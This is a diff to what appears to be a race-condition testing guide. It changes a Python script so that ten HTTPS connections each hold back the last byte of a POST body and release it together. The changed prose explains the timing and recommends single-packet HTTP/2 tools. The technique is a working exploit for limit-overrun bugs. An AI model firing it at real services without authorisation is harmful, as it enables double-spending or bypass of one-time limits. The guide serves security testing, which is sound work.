@@ -64,7 +64,7 @@ barrier, out, lock = threading.Barrier(N), [], threading.Lock()
 
 def go(i):
     c = http.client.HTTPSConnection(HOST, 443, context=ctx, timeout=20)
-    # build the request but hold the last byte until everyone is ready
+    # send the headers and all but the final body byte, then hold that byte
     c.putrequest("POST", PATH, skip_host=True)   # we set Host ourselves; without this
                                                  # http.client adds a second one and the
                                                  # request is invalid per RFC 7230
@@ -72,9 +72,10 @@ def go(i):
     c.putheader("Authorization", f"Bearer {TOK}")
     c.putheader("Content-Type", "application/json")
     c.putheader("Content-Length", str(len(BODY)))
-    c.endheaders()
+    c.endheaders()                     # http.client flushes the whole header block here
+    c.send(BODY.encode()[:-1])         # everything except the last byte
     barrier.wait()                     # <-- all threads release together
-    c.send(BODY.encode())
+    c.send(BODY.encode()[-1:])         # one byte each: the request completes on arrival
     r = c.getresponse()
     with lock: out.append((i, r.status, r.read()[:120]))
     c.close()
@@ -85,9 +86,20 @@ for i, s, b in sorted(out): print(i, s, b.decode(errors="replace"))
 PY
 ```
 
-The barrier is what makes this work: all ten connections complete their headers, then release
-the body simultaneously. With HTTP/2 you can do better - a single TCP packet carrying multiple
-streams removes network jitter entirely (Burp's "single-packet attack", or `h2load`-style tools).
+The barrier is what makes this work: all ten connections send their headers and all but one byte
+of the body, then release that final byte together, so all ten requests become complete at the
+server within microseconds of each other - no thread has a body write left to do after the gun
+goes off. `endheaders()`
+flushes the header block immediately, which is why the held byte has to be carved off the body
+yourself; holding the *whole* body instead leaves every thread one extra write and TLS record
+inside the window you are trying to close.
+
+With HTTP/2 you can do better - one TCP packet carrying multiple streams removes network jitter
+entirely. Use a tool that actually implements that primitive: Burp's **single-packet attack**, or
+Turbo Intruder on the HTTP/2 engine, or a small `nghttp2`/`h2` client that writes N HEADERS+DATA
+frames into a single `write()`. Not `h2load` - that is nghttp2's throughput benchmarker, driven by
+`-n` total requests and `-c` connections with no last-byte or single-packet sync at all, and
+pointing it at a target is the sustained high-volume traffic the rule above forbids.
 
 **4. Read the *state*, not the responses.** Ten `200`s prove nothing; the ledger does.
 
